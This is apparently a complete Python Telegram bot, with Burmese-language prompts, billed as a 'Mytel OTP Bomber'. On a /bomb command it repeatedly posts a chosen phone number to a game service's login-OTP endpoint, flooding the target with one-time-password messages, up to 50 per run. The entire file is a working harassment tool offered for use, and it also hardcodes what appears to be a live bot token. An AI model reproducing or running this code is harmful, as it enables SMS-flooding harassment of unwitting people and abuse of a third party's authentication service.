import telebot
from telebot import types
import requests
import time
import threading

# Bot Token ကို တိုက်ရိုက်ထည့်သွင်းထားပါသည်
TOKEN = '8183997269:AAElovxXFRd40oatzEtSnKpVm8UAheNvAQw'
bot = telebot.TeleBot(TOKEN)

# API Base URL
BASE_URL = "https://mytel.bubblepop.info/game-service/v1"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_start = types.InlineKeyboardButton("🚀 စတင်ရန် (/bomb)", callback_data="menu_start")
    btn_help = types.InlineKeyboardButton("ℹ️ အကူအညီ", callback_data="menu_help")
    markup.add(btn_start, btn_help)
    
    bot.reply_to(message, "🤖 Mytel OTP Bomber Bot မှ ကြိုဆိုပါတယ်။\nအောက်ပါ ခလုတ်များကို အသုံးပြုနိုင်ပါသည် -", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "menu_start":
        bot.send_message(call.message.chat.id, "📱 ကျေးဇူးပြု၍ ဖုန်းနံပါတ်နှင့် အကြိမ်ရေကို ဤကဲ့သို့ ပို့ပေးပါ။\n\nဥပမာ: `/bomb 09912345678 10`", parse_mode="Markdown")
    elif call.data == "menu_help":
        bot.send_message(call.message.chat.id, "ℹ️ **အသုံးပြုပုံ ညွှန်ကြားချက်**\n\n- `/bomb <ဖုန်းနံပါတ်> <အကြိမ်ရေ>` ဟု ရိုက်ထည့်ပါ။\n- ဥပမာ: `/bomb 09912345678 10`\n- တစ်ကြိမ်လျှင် အများဆုံး အကြိမ် ၅၀ အထိ သတ်မှတ်ပေးထားပါသည်။", parse_mode="Markdown")

@bot.message_handler(commands=['bomb'])
def start_bombing(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "❌ ပုံစံမမှန်ပါ။ ဤကဲ့သို့ ရိုက်ထည့်ပါ:\n`/bomb <ဖုန်းနံပါတ်> <အကြိမ်ရေ>`", parse_mode="Markdown")
        return

    phone_number = args[1]
    try:
        count = int(args[2])
    except ValueError:
        bot.reply_to(message, "❌ အကြိမ်ရေသည် ဂဏန်းဖြစ်ရပါမည်။")
        return

    if count > 50:
        bot.reply_to(message, "⚠️ ဆာဗာ ဝန်ပိမှုမရှိစေရန် တစ်ကြိမ်လျှင် အများဆုံး ၅၀ အထိသာ ခွင့်ပြုထားပါသည်။")
        count = 50

    markup = types.InlineKeyboardMarkup()
    btn_stop = types.InlineKeyboardButton("🛑 ရပ်တန့်မည်", callback_data=f"stop_{message.chat.id}")
    markup.add(btn_stop)

    bot.reply_to(message, f"🚀 စတင်နေပါပြီ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 အကြိမ်ရေ: `{count}` ကြိမ်", parse_mode="Markdown", reply_markup=markup)

    threading.Thread(target=run_bomber, args=(message.chat.id, phone_number, count)).start()

def run_bomber(chat_id, phone_number, count):
    success_count = 0
    fail_count = 0

    url = f"{BASE_URL}/user/loginOtp"
    payload = {"msisdn": phone_number}

    for i in range(count):
        try:
            response = requests.post(url, json=payload, timeout=10)
            data = response.json()
            status = str(data.get("status", ""))
            
            if status in ["200", "00000"]:
                success_count += 1
            else:
                fail_count += 1
        except Exception:
            fail_count += 1
        
        time.sleep(1)

    bot.send_message(chat_id, f"✅ **Bomber ပြီးဆုံးပါပြီ!**\n\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n✨ အောင်မြင်မှု: `{success_count}` ကြိမ်\n❌ မှားယွင်းမှု: `{fail_count}` ကြိမ်", parse_mode="Markdown")

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
